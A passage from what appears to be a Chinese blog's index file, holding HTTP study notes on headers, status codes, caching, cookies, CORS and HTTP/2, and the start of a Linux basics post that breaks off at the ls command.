<td>Trailer</td>
<td>报文末端的首部一览</td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td>指定报文主体的传输编码方式</td>
</tr>
<tr>
<td>Upgrade</td>
<td>升级为其他协议</td>
</tr>
<tr>
<td>Via</td>
<td>代理服务器的相关信息</td>
</tr>
<tr>
<td>Warning</td>
<td>错误通知</td>
</tr>
</tbody></table>
</li>
<li><p>请求报文头</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>用户代理可处理的媒体类型</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>优先的字符集</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>优先的内容编码</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>优先的语言（自然语言）</td>
</tr>
<tr>
<td>Authorization</td>
<td>Web认证信息</td>
</tr>
<tr>
<td>Expect</td>
<td>期待服务器的特定行为</td>
</tr>
<tr>
<td>From</td>
<td>用户的电子邮箱地址</td>
</tr>
<tr>
<td>Host</td>
<td>请求资源所在服务器</td>
</tr>
<tr>
<td>If-Match</td>
<td>比较实体标记（ETag）</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>比较资源的更新时间</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>比较实体标记（与If-Match相反）</td>
</tr>
<tr>
<td>If-Range</td>
<td>资源未更新时发送试题Byte的范围请求</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>比较资源的更新时间（与If-Modified-Since相反）</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>最大传输逐跳数</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td>Range</td>
<td>实体的字节范围请求</td>
</tr>
<tr>
<td>Referer</td>
<td>对请求中URI的院士获取方</td>
</tr>
<tr>
<td>TE</td>
<td>传输编码的优先级</td>
</tr>
<tr>
<td>User-Agent</td>
<td>HTTP客户端程序的信息</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h5 id="HTTP长连接与短连接"><a href="#HTTP长连接与短连接" class="headerlink" title="HTTP长连接与短连接"></a>HTTP长连接与短连接</h5><ul>
<li>HTTP协议是基于请求/响应模式的，因此只要服务端给了响应，本次HTTP请求就结束了</li>
<li>HTTP的长连接和短连接本质上是TCP长连接和短连接</li>
<li>HTTP/1.0中，默认使用的是短连接，也就是说，浏览器和服务器每进行一次HTTP操作，就建立一次连接，结束就中断</li>
<li>HTTP/1.1起，默认使用长连接，用以保持连接特性</li>
<li>短连接：建立连接-数据传输-关闭连接（重复这些步骤）</li>
<li>长连接：建立连接-数据传输…（保持连接）…数据传输-关闭连接</li>
</ul>
<h5 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h5><ul>
<li>GET：用来请求访问已被URI识别的资源，指定的资源经服务器端解析后返回响应内容，GET方法也可以用来提交表单和其他数据，通过地址传参方式</li>
<li>POST：一般用来传输实体的主体，主要目的不是获取响应主体的内容</li>
<li>PUT：从客户端向服务器传送的数据取代指定的文档的内容，该方法与POST方法最大的不同是：PUT是幂等的，而POST是不幂等的，因此，更多时候将PUT方法用作传输资源</li>
<li>HEAD：类似GET请求，只不过返回的响应中没有具体的内容，用于获取报头</li>
<li>DELETE：请求服务器删除指定的资源</li>
<li>OPTIONS：预检请求，用来查询针对请求URI指定的资源支持的方法</li>
<li>TRACE：回显服务器收到的请求，主要用于测试或诊断</li>
<li>CONNECT：开启一个客户端与所请求资源之间的双向沟通的通道，它可以用来创建隧道</li>
</ul>
<h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><ul>
<li><strong>1xx：</strong>请求已接收到，需要进一步处理才能完成，HTTP1.0不支持<ul>
<li><strong>100 Continue：</strong>上传大文件前使用。<ul>
<li>由客户端发起请求中携带Expect：100-continue头部触发。</li>
</ul>
</li>
<li><strong>101 Switch Protocols：</strong>协议升级使用。<ul>
<li>由客户端发起请求中携带Upgrade头部触发，如升级websocket或者http/2.0。</li>
</ul>
</li>
<li><strong>102 Processing：</strong>WebDAV请求可能包含许多设计文件操作的自请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。</li>
</ul>
</li>
<li><strong>2xx：</strong>成功处理请求’<ul>
<li><strong>200  OK：</strong>成功返回响应。</li>
<li><strong>201 Created：</strong>有新资源在服务器端被成功创建。</li>
<li><strong>202 Accepted：</strong>服务器接收并开始处理请求，但请求未处理完成。这样一个模糊的概念是有意如此设计的，可以覆盖更多的场景。例如异步、需要长时间处理的任务。</li>
<li><strong>203 Non-Authoritative Information：</strong>当代理服务器修改了origin server的原始响应包体时（例如更换了HTML中的元素值），代理服务器可以通过修改200为203的方式告知客户端这一个事实，方便客户端为这一行为做出相应的处理。203响应可以被缓存。</li>
<li><strong>204 No Content：</strong>成功执行了请求但是不携带响应包体， 并暗示客户端无需更新当前的页面视图。</li>
<li><strong>205 Reset Content：</strong>成功执行了请求且不携带响应包体，同时指明客户端需要更新当前页面视图。</li>
<li><strong>206 Partial Content：</strong>使用range协议时返回部分响应内容时的响应码。</li>
<li><strong>207 Multi-Status：</strong>在WEBDAV协议中以XML返回多个资源的状态。</li>
<li><strong>208 Already Reported：</strong>为避免相同集合下资源在207响应码下重复上报，使用208可以使用父集合的响应码。</li>
</ul>
</li>
<li><strong>3xx：</strong>重定向使用Location指向的资源或者缓存中的资源。在RFC2068中规定客户端重定向次数不应该超过5次，以防止死循环。<ul>
<li><strong>300 Multiple Choices：</strong>资源有多种表述，通过300返回给客户端后由其自行选择访问哪一种表述。由于缺乏明确的细节，300很少使用。</li>
<li><strong>301 Moved Permanently：</strong>资源永久性地重定向到另一个URI中。</li>
<li><strong>302 Found：</strong>资源临时地重定向到另一个URI中。</li>
<li><strong>303 See Other：</strong>重定向到其他资源，常用于POST/PUT等方法的响应中。</li>
<li><strong>304 Not Modified：</strong>当客户端拥有可能过期的缓存时，会携带缓存的标识etag、时间等信息询问服务器缓存是否仍可复用，而304是告诉客户端可以复用缓存。</li>
<li><strong>307 Temporary Redirect：</strong>类似302，但明确重定向后请求方法必须与原请求方法相同，不得改变。</li>
<li><strong>308 Permanent Redirect：</strong>类似301，但明确重定向后请求方法必须与原请求方法相同，不得改变。</li>
</ul>
</li>
<li><strong>4xx：</strong>客户端出现错误<ul>
<li><strong>400 Bad Request：</strong>服务器认为客户端出现了错误，但不能明确判断为哪种错误时使用此错误码。例如HTTP请求格式错误。</li>
<li><strong>401 Unauthorized：</strong>用户认证信息缺失或者不正确，导致服务器无法处理请求。</li>
<li><strong>407 Proxy Authentication Required：</strong>对需要经由代理的请求，认证信息未通过代理服务器的验证</li>
<li><strong>403 Forbidden：</strong>服务器理解请求的含义，但没有权限执行此请求</li>
<li><strong>404 Not Found：</strong>服务器没有找到对应的资源</li>
<li><strong>410 Gone：</strong>服务器没有找到对应的资源，且明确地之道该位置永久性找不到该资源</li>
<li><strong>405 Method Not Allowed：</strong>服务器不支持请求行中的method方法</li>
<li><strong>406 Not Acceptable：</strong>对客户端指定的资源表述不存在（例如对语言或者编码有要求），服务器返回表述列表供客户端选择</li>
<li><strong>408 Request Timeout：</strong>服务器接收请求超时</li>
<li><strong>409 Conflict：</strong>资源冲突，例如上传文件时目标位置已经存在版本更新的资源</li>
<li><strong>411 Length Required：</strong>如果请求含有包体且未携带Content-Length头部，且不属于Chunk类请求时，返回411</li>
<li><strong>412 Precondition Failed：</strong>复用缓存时传递的If-Unmodified-Since或If-None-Match头部不被满足</li>
<li><strong>413 Payload Too Large/Request Entity Too Large：</strong>请求的包体超出服务器能处理的最大长度</li>
<li><strong>414 URI Too Long：</strong>请求的URI超出服务器能接受的最大长度</li>
<li><strong>415 Unsupported Media Type：</strong>上传的文件类型不被服务器支持</li>
<li><strong>416 Range Not Satisfiable：</strong>无法提供Range请求中指定的那段包体</li>
<li><strong>417 Expectation Failed：</strong>对于Expect请求头部期待的情况无法满足时的响应码</li>
<li><strong>421 Misdirected Request：</strong>服务器认为这个请求不该发给它，因为它没有能力处理。</li>
<li><strong>426 Upgrade Required：</strong>服务器拒绝基于当前HTTP协议提供服务，通过Upgrade头部告知客户端必须升级协议才能继续处理。</li>
<li><strong>428 Precondition Required：</strong>用户请求中缺失了条件类头部，例如If-Match</li>
<li><strong>429 Too Many Requests：</strong>客户端发送请求的速率过快</li>
<li><strong>431 Request Header Fields Too Large：</strong>其你去的HEADER头部大小超过限制</li>
<li><strong>451 Unavailable For Legal Reasons：</strong>由于法律原因资源不可访问</li>
</ul>
</li>
<li><strong>5xx：</strong>服务器端出现错误<ul>
<li><strong>500 Internal Server Error：</strong>服务器内部错误，且不属于以下错误类型</li>
<li><strong>501 Not Implemented：</strong>服务器不支持实现请求所需要的功能</li>
<li><strong>502 Bad Gateway：</strong>代理服务器无法获取到合法响应</li>
<li><strong>503 Service Unavailable：</strong>服务器资源尚未准备好处理当前请求</li>
<li><strong>504 Gateway Timeout：</strong>代理服务器无法及时从上游获得响应</li>
<li><strong>505 HTTP Version Not Supported：</strong>其你去使用的HTTP协议版本不支持</li>
<li><strong>507 Insufficient Storage：</strong>服务器没有足够的空间处理请求</li>
<li><strong>508 Loop Detected：</strong>访问资源时检测到循环</li>
<li><strong>511 Network Authentication Required：</strong>代理服务器发现客户端需要进行身份验证才能获得网络访问权限</li>
</ul>
</li>
</ul>
<h5 id="HTTP中介之代理"><a href="#HTTP中介之代理" class="headerlink" title="HTTP中介之代理"></a>HTTP中介之代理</h5><p>代理既是客户端，也是服务端</p>
<p>对于Web客户端来说，代理扮演的是服务器的角色，接受Request，返回Response</p>
<p>对于Web服务器来说，代理扮演的是客户端的角色，发送Request，接受Response</p>
<p>典型的代理服务器例如Fiddler，WireShark等</p>
<p><strong>代理常见用处：</strong></p>
<ul>
<li>抓包</li>
<li>科学上网</li>
<li>匿名访问 (中间代理服务器可以隐藏原始ip等信息)</li>
<li>过滤器</li>
</ul>
<h5 id="HTTP中介之网关"><a href="#HTTP中介之网关" class="headerlink" title="HTTP中介之网关"></a>HTTP中介之网关</h5><p>网关是一种协议转换器，连接的是使用两种不同协议的端点</p>
<ul>
<li>（HTTP/）服务器端网关：通过HTTP协议与客户端对话，通过其他协议与服务器通信。</li>
<li>（/HTTP）客户端网关：通过其他协议与客户端对话，通过HTTP协议与服务器通信。</li>
</ul>
<p><strong>常见的网关类型：</strong></p>
<ul>
<li>（HTTP/*）服务器端Web网关</li>
<li>（HTTP/HTTPS）服务器端安全网关</li>
<li>（HTTPS/HTTP）客户端安全加速器网关</li>
<li>资源网关</li>
</ul>
<h5 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h5><h6 id="HTTP缓存作用"><a href="#HTTP缓存作用" class="headerlink" title="HTTP缓存作用"></a>HTTP缓存作用</h6><ul>
<li>减少冗余请求，节省开销</li>
<li>减少服务器负担，提高网站性能</li>
<li>加快客户端网页加载的速度</li>
</ul>
<h6 id="HTTP缓存头部字段"><a href="#HTTP缓存头部字段" class="headerlink" title="HTTP缓存头部字段"></a>HTTP缓存头部字段</h6><ul>
<li>Cache-Control    请求/响应头，缓存控制字段<ul>
<li>no-store：所有内容都不缓存</li>
<li>no-cache：缓存，但是浏览器使用缓存前，都会请求服务器判断缓存资源是否是最新。</li>
<li>max-age=x(单位：秒) 请求缓存后的x秒不再发起请求。</li>
<li>s-maxage=x(单位：秒)代理服务器请求源站缓存后的x秒不再发起请求，只对CDN缓存有效</li>
<li>public：客户端和代理服务器(CDN)都可缓存</li>
<li>private：只有客户端可以缓存 </li>
</ul>
</li>
<li>Expires：响应头，代表资源过期时间，由服务器返回提供，是HTTP1.0的属性，在与max-age共存的情况下，优先级相对要低</li>
<li>Last-Modified：响应头，资源最新修改时间，由服务器告诉浏览器</li>
<li>if-Modified-Since：请求头，资源最新修改时间，由浏览器告诉服务器，和Last-Modified是一对，它两会进行比对</li>
<li>Etag：响应头，资源标识，由服务器告诉浏览器</li>
<li>if-None-Match：请求头，缓存资源标识，由浏览器告诉服务器，和Etag是一对，它两会进行比对</li>
</ul>
<h6 id="缓存改进方案"><a href="#缓存改进方案" class="headerlink" title="缓存改进方案"></a>缓存改进方案</h6><ul>
<li>MD5/Hash缓存：通过不缓存html，为静态文件添加MD5或者Hash标识，解决浏览器无法跳过缓存过期时间主动感知文件变化的问题</li>
<li>CDN缓存 ：CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络堵塞，提高用户访问响应速度和命中率</li>
</ul>
<h6 id="浏览器操作对HTTP缓存的影响"><a href="#浏览器操作对HTTP缓存的影响" class="headerlink" title="浏览器操作对HTTP缓存的影响"></a>浏览器操作对HTTP缓存的影响</h6><table>
<thead>
<tr>
<th>用户操作</th>
<th>Expires/Cache-Control</th>
<th>Last-Modified/Etag</th>
</tr>
</thead>
<tbody><tr>
<td>地址栏回车</td>
<td>有效</td>
<td>有效</td>
</tr>
<tr>
<td>页面链接跳转</td>
<td>有效</td>
<td>有效</td>
</tr>
<tr>
<td>新开窗口</td>
<td>有效</td>
<td>有效</td>
</tr>
<tr>
<td>前进、后退</td>
<td>有效</td>
<td>有效</td>
</tr>
<tr>
<td>F5刷新</td>
<td>无效</td>
<td>有效</td>
</tr>
<tr>
<td>Ctrl+F5刷新</td>
<td>无效</td>
<td>无效</td>
</tr>
</tbody></table>
<h5 id="Cookie使用的限制"><a href="#Cookie使用的限制" class="headerlink" title="Cookie使用的限制"></a>Cookie使用的限制</h5><ul>
<li>浏览器使用Cookie的要求<ul>
<li>每条Cookie的长度（包括name、value以及描述的属性总长度）至少要达到4KB</li>
<li>每个域名下至少支持50个Cookie</li>
<li>至少要支持3000个Cookie</li>
</ul>
</li>
<li>代理服务器传递Cookie时会有限制</li>
</ul>
<h5 id="Cookie存在的问题"><a href="#Cookie存在的问题" class="headerlink" title="Cookie存在的问题"></a>Cookie存在的问题</h5><ul>
<li>Cookie会被附加到每个HTTP请求中，所以无形中增加了流量</li>
<li>由于在HTTP请求中的Cookie是明文传输的，所以存在安全性问题</li>
<li>Cookie的大小不应超过4KB，故对于复杂的存储需求来说是不够用的</li>
</ul>
<h5 id="第三方Cookie"><a href="#第三方Cookie" class="headerlink" title="第三方Cookie"></a>第三方Cookie</h5><p>浏览器允许对于不安全域下的资源（例如广告图片）响应中的Set-Cookie保存，并在后续访问该域时自动使用Cookie</p>
<h5 id="浏览器的同源策略"><a href="#浏览器的同源策略" class="headerlink" title="浏览器的同源策略"></a>浏览器的同源策略</h5><p>限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互</p>
<ul>
<li><p>何为同源？协议、主机、端口必须完全相同</p>
</li>
<li><p>例如：<a href="http://a.test.com/dir/page.html%E6%A3%80%E6%B5%8B%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%90%A6%E5%90%8C%E6%BA%90">http://a.test.com/dir/page.html检测以下是否同源</a></p>
<table>
<thead>
<tr>
<th><strong>URL</strong></th>
<th>结果</th>
<th>原因</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://a.test.com/dir2/other.html">http://a.test.com/dir2/other.html</a></td>
<td>成功</td>
<td>只有路径不同</td>
</tr>
<tr>
<td><a href="http://a.test.com/dir/inner/another.html">http://a.test.com/dir/inner/another.html</a></td>
<td>成功</td>
<td>只有路径不同</td>
</tr>
<tr>
<td><a href="https://store.company.com/secure.html">https://store.company.com/secure.html</a></td>
<td>失败</td>
<td>不同协议（https和http）</td>
</tr>
<tr>
<td><a href="http://a.test.com:81/dir/etc.html">http://a.test.com:81/dir/etc.html</a></td>
<td>失败</td>
<td>不同端口（http默认端口是80)，和81端口不同）</td>
</tr>
<tr>
<td><a href="http://b.test.com/dir/other.html">http://b.test.com/dir/other.html</a></td>
<td>失败</td>
<td>不同域名（a和b）</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h5><p>CORS（Cross-Origin Resource Sharing）可以用来解决跨域问题。</p>
<p>浏览器会对所有跨域请求进行验证，分为简单请求验证处理和预检请求验证处理</p>
<h6 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h6><ul>
<li>GET/HEAD/POST方法之一</li>
<li>仅能使用CORS安全的头部：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Content-Type</code></li>
<li>Content-Type值只能是：<code>text/plain</code>、<code>multipart/form-data</code>、<code>application/x-www-form-urlencoded</code>三者其中之一</li>
</ul>
<h6 id="简单请求以外的其他请求"><a href="#简单请求以外的其他请求" class="headerlink" title="简单请求以外的其他请求"></a>简单请求以外的其他请求</h6><ul>
<li>访问资源前，需要先发起preflight预检请求（方法为OPTIONS）询问何种请求是被允许的</li>
</ul>
<h6 id="预检请求头部"><a href="#预检请求头部" class="headerlink" title="预检请求头部"></a>预检请求头部</h6><ul>
<li><p>Origin</p>
<ul>
<li>来自哪个域名</li>
</ul>
</li>
<li><p>Access-Control-Request-Method</p>
<ul>
<li>在preflight预检请求（OPTIONS）中，告知服务器接下来的请求会使用哪些方法</li>
</ul>
</li>
<li><p>Access-Control-Request-Headers</p>
<ul>
<li>在preflight预检请求（OPTIONS）中，告知服务器接下来的请求会传递哪些头部</li>
</ul>
</li>
</ul>
<h6 id="预检请求响应"><a href="#预检请求响应" class="headerlink" title="预检请求响应"></a>预检请求响应</h6><ul>
<li>Access-Control-Allow-Methods<ul>
<li>在preflight预检请求的响应中，告知客户端后续请求允许使用的方法</li>
</ul>
</li>
<li>Access-Control-Allow-Headers<ul>
<li>在preflight预检请求的响应中，告知客户端后续请求允许携带的头部</li>
</ul>
</li>
<li>Access-Control-Max-Age<ul>
<li>在preflight预检请求的响应中，告知客户端该响应的信息可以缓存多久</li>
</ul>
</li>
<li>Access-Control-Expose-Headers<ul>
<li>告知浏览器哪些响应头部可以供客户端使用，默认情况下只有<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>可供使用</li>
</ul>
</li>
<li>Access-Control-Allow-Origin<ul>
<li>告知浏览器允许哪些域访问当前资源，<code>*</code>表示允许所有域</li>
</ul>
</li>
<li>Access-Control-Allow-Credentials<ul>
<li>告知浏览器是否可以将<code>Credentials</code>暴露给客户端使用，<code>Credentials</code>包含<code>cookie</code>、<code>authorization</code>类头部、TLS证书等</li>
</ul>
</li>
</ul>
<h5 id="内容协商机制"><a href="#内容协商机制" class="headerlink" title="内容协商机制"></a>内容协商机制</h5><p>指客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言，字符集，编码方式等作为判断的基准</p>
<h6 id="内容协商方式"><a href="#内容协商方式" class="headerlink" title="内容协商方式"></a>内容协商方式</h6><ul>
<li>客户端驱动：客户端发起请求，服务器发送可选项列表，客户端做出选择后再发送第二次请求</li>
<li>服务器驱动：服务器检查客户端的请求头部集并决定提供哪个版本的页面</li>
<li>透明协商</li>
<li>某个中间设备（通常是缓存代理）代表客户端进行协商</li>
</ul>
<h6 id="请求首部集"><a href="#请求首部集" class="headerlink" title="请求首部集"></a>请求首部集</h6><ul>
<li>Accept：告知服务器发送何种媒体类型</li>
<li>Accept-Language：告知服务器发送何种语言</li>
<li>Accept-Charset：告知服务器发送何种字符集</li>
<li>Accept-Encoding：告知服务器采用何种编码</li>
</ul>
<h6 id="响应首部集"><a href="#响应首部集" class="headerlink" title="响应首部集"></a>响应首部集</h6><ul>
<li>Content-Type：对应请求首部Accept和Accept-Charset</li>
<li>Content-Language：对应请求首部Accept-Language</li>
<li>Content-Encoding：对应请求首部Accept-Encoding</li>
</ul>
<h5 id="断点续传和多线程下载"><a href="#断点续传和多线程下载" class="headerlink" title="断点续传和多线程下载"></a>断点续传和多线程下载</h5><p>HTTP是通过在Header里两个参数实现的，客户端发请求时对应的是<code>Range</code>，服务端响应时对应的是<code>Content-Range</code></p>
<ul>
<li><p>Range</p>
<p>Range：bytes=0-499</p>
<p>Range：bytes=500-999</p>
<p>Range：bytes=-500</p>
<p>Range：bytes=500-</p>
<p>Range：bytes=500-600,601-999</p>
</li>
<li><p>Content-Range</p>
<p>在响应完成后，返回的响应头内容也不同：</p>
<ul>
<li>HTTP/1.1 200 OK (不使用断点续传方式)</li>
<li>HTTP/1.1 206 Partial Content (使用断点续传方式)</li>
</ul>
</li>
</ul>
<h6 id="断点续传过程"><a href="#断点续传过程" class="headerlink" title="断点续传过程"></a>断点续传过程</h6><ol>
<li>客户端下载一个1024K文件，已经下载了其中512K</li>
<li>网络中断，客户端请求续传，因此需要在HTTP头中申明本次需要续传的片段：<code>Range:bytes=512000-</code>这个头通知服务端从文件的512K位置开始传输文件。</li>
<li>服务端收到断点续传请求，从文件的512K位置开始传输，并且在HTTP头中增加：<code>Content-Range:bytes 512000-/1024000</code>，并且此时服务端返回的HTTP状态码应该是206，而不是200</li>
</ol>
<h5 id="HTTP-1-1遇到的问题"><a href="#HTTP-1-1遇到的问题" class="headerlink" title="HTTP/1.1遇到的问题"></a>HTTP/1.1遇到的问题</h5><ul>
<li>高延迟带来页面加载速度的降低<ul>
<li>随着带宽的增加，延迟并没有显著下降</li>
<li>并发连接有限</li>
<li>同一连接同时只能在完成一个HTTP事务（请求/响应）才能处理下一个事务</li>
</ul>
</li>
<li>单连接上的串行请求</li>
<li>无状态导致的高传输量（低网络效率）</li>
<li>重复传输的体积巨大的HTTP头部</li>
<li>不支持服务器推送消息</li>
</ul>
<h5 id="HTTP2特性"><a href="#HTTP2特性" class="headerlink" title="HTTP2特性"></a>HTTP2特性</h5><ul>
<li>传输数据量大幅减少<ul>
<li>以二进制方式传输</li>
<li>标头压缩</li>
</ul>
</li>
<li>多路复用及相关功能<ul>
<li>消息优先级</li>
</ul>
</li>
<li>服务端消息推送<ul>
<li>并行推送</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础知识点整理</title>
    <url>/20200912/014530.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>Linux，全称GNU/Linux，是一套免费使用和自由传播的类UNIX操作系统。是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统，能运行主要的 UNIX 工具软件、应用程序和网络协议，Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、Linux比较流行的发行版"><a href="#1、Linux比较流行的发行版" class="headerlink" title="1、Linux比较流行的发行版"></a>1、Linux比较流行的发行版</h5><ul>
<li><p>Slackware</p>
<blockquote>
<p>最早的Linux发行版中的一员，在Linux极客中比较流行</p>
</blockquote>
</li>
<li><p>Red Hat</p>
<blockquote>
<p>主要用于Internet服务器的商业发行版，性能稳定</p>
</blockquote>
</li>
<li><p>RHEL</p>
<blockquote>
<p>Red Hat的企业版</p>
</blockquote>
</li>
<li><p>Fedora</p>
<blockquote>
<p>从Red Hat分离出的社区免费版</p>
</blockquote>
</li>
<li><p>CentOS</p>
<blockquote>
<p>算是RHEL的克隆版，免费。结合了RHEL和Fedora的特性，兼具Community(社区)和Enterprise(企业)的特性，稳定，每个版本一般都有长期的支持(10年)，适合做服务器</p>
</blockquote>
</li>
<li><p>Deepin</p>
<blockquote>
<p>中国发行。对优秀的开源产品进行集成和配置，开发软件</p>
</blockquote>
</li>
<li><p>Gentoo</p>
<blockquote>
<p>为高级Linux用户设计的发行版，仅包含Linux源代码</p>
</blockquote>
</li>
<li><p>openSUSE</p>
<blockquote>
<p>用于商用和家用的发行版</p>
</blockquote>
</li>
<li><p>Debian</p>
<blockquote>
<p>在Linux专家和商用Linux产品中流行的发行版，迄今为止，最遵循GNU规范的Linux系统</p>
</blockquote>
</li>
<li><p>Ubuntu</p>
<blockquote>
<p>Debian的后继或一个分支</p>
</blockquote>
</li>
</ul>
<h5 id="2、命令行相关操作"><a href="#2、命令行相关操作" class="headerlink" title="2、命令行相关操作"></a>2、命令行相关操作</h5><h6 id="1、查找命令和命令的历史记录"><a href="#1、查找命令和命令的历史记录" class="headerlink" title="1、查找命令和命令的历史记录"></a>1、查找命令和命令的历史记录</h6><ul>
<li>查找命令<ul>
<li><code>Tab</code>键：可以补全命令，也可以补全文件名、路径名，按两次Tab键即可</li>
</ul>
</li>
<li>命令的历史记录<ul>
<li><code>↑</code>键：按时间顺序向前查找用过的命令，每按一次就前进一个命令</li>
<li><code>↓</code>键：按时间顺序向后查找用过的命令，没按一次就前进一个命令</li>
<li><code>Ctrl + R</code>：用于查找使用过的命令</li>
<li><code>history</code>命令：用于列出之前使用过的所有命令，可以用<code>!编号</code>这样的格式来重新运行history输出中对应编号的命令</li>
</ul>
</li>
</ul>
<h6 id="2、一些使用的快捷键"><a href="#2、一些使用的快捷键" class="headerlink" title="2、一些使用的快捷键"></a>2、一些使用的快捷键</h6><ul>
<li><code>Ctrl + L</code>：用于清理终端的内容，清屏，和<code>clear</code>命令一样</li>
<li><code>Ctrl + D</code>：给终端传递EOF（End Of File，文件结束符） </li>
<li><code>Shift + PgUp</code>：用于向上滚屏，与鼠标的滚轮向上滚屏是一个效果</li>
<li><code>Shift + PgDn</code>：用于向下滚屏，与鼠标的滚轮向下滚屏是一个效果</li>
<li><code>Ctrl + A</code>：光标跳到一行命令的开头，Home键有相同的效果</li>
<li><code>Ctrl + E</code>：光标跳到一行命令的结尾，End键有相同的效果</li>
<li><code>Ctrl + U</code>：删除所在光标的左侧的所有命令字符</li>
<li><code>Ctrl + K</code>：删除所在光标的右侧的所有命令字符  </li>
<li><code>Ctrl + W</code>：删除所在光标的左侧的一个单词，即使用空格隔开的字符串 </li>
</ul>
<h6 id="3、Linux中的文件"><a href="#3、Linux中的文件" class="headerlink" title="3、Linux中的文件"></a>3、Linux中的文件</h6><blockquote>
<p>Linux中一切都是文件</p>
</blockquote>
<ul>
<li><p>普通文件</p>
<ul>
<li>文本类型的文件（.txt,.doc,.odt等）</li>
<li>声音文件（.wav,.mp3,.ogg）,还有程序等</li>
</ul>
</li>
<li><p>特殊文件</p>
<ul>
<li>光盘驱动器</li>
</ul>
</li>
</ul>
<h6 id="4、Linux的目录"><a href="#4、Linux的目录" class="headerlink" title="4、Linux的目录"></a>4、Linux的目录</h6><p>目录基础概念：</p>
<blockquote>
<p>Linux有且只有一个根目录，就是<code>/</code>。</p>
<p>Linux中没有比根目录再高一阶的目录了，没有目录包含根目录。</p>
<p>Linux中用斜杠<code>/</code>来标明目录的层级与包含关系。</p>
<p>目录形式是这样的 <code>/usr/bin</code>，<code>bin</code>是<code>usr</code>目录的子目录，<code>usr</code>是<code>/</code>这个根目录的子目录</p>
</blockquote>
<p>目录组织：</p>
<ul>
<li><code>bin</code>：英语binary的缩写，表示“二进制文件”，可执行文件时二进制的，该目录包含了会被所有用户使用的可执行程序</li>
<li><code>boot</code>：英语boot表示“启动”，该目录包含于Linux启动密切相关的文件</li>
<li><code>dev</code>：英语device的缩写，表示“设备”，该目录包含外设，它里面的子目录，每一个对应一个外设，比如代表光盘驱动器的文件就会出现在这个目录下面 </li>
<li><code>etc</code>：该目录包含系统的配置文件</li>
<li><code>home</code>：用户的私人目录 ，Linux中的每个用户都在home目录下有一个私人目录，假设用户的用户名是test_name,那么他的私人目录就是<code>/home/test_name</code></li>
<li><code>lib</code>：英语library的缩写，表示库，该目录包含被程序所调用的库文件，例如.so结尾的文件</li>
<li><code>media</code>：英语media表示“媒体”，可移动的外设（USB盘，SD卡，DVD，光盘，等等）插入电脑时，我们可以通过<code>media</code>的子目录来访问这些外设中的内容</li>
<li><code>mnt</code>：英语mount的缩写，表示“挂载”，类似<code>media</code>目录，但一般用于临时挂载一些装置</li>
<li><code>opt</code>：英语optional application software package的缩写，表示“可选的英语软件包” ，用于安装多数第三方软件和插件</li>
<li><code>root</code>：超级用户root的家目录，一般用户的家目录位于<code>/home</code>下，root用户例外</li>
<li><code>sbin</code>：英语system binary的缩写，表示“系统二进制文件”，比<code>bin</code>目录多了一个前缀system（“系统”），该目录包含系统级的重要可执行程序</li>
<li><code>tmp</code>：英语temporary的缩写，表示“临时的”，是普通用户和程序存放临时文件的地方</li>
<li><code>srv</code>：英语service的缩写，表示“服务”，该目录包含一些网络服务启动之后所需要取用的数据</li>
<li><code>usr</code>：英语Unix Software Resource的缩写，表示”Unix操作系统软件资源”，类似<code>etc</code>，是历史遗留的命名，<code>usr</code>目录是最庞大的目录之一，安装了大部分用户要调用的程序</li>
<li><code>var</code>：英语variable的缩写，表示”动态的，可变的“，通常包含程序的数据，比如log（日志）文件，log文件记录电脑中发生了什么事</li>
</ul>
<p>目录相关命令：</p>
<ul>
<li><p><code>pwd</code>：显示当前目录的路径</p>
</li>
<li><p><code>which</code>：获取命令的可执行文件的位置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">which pwd <span class="comment">//获取pwd命令的可执行文件的位置</span></span><br><span class="line"></span><br><span class="line">/usr/bin/pwd</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ls</code>：列出文件和目录</p>
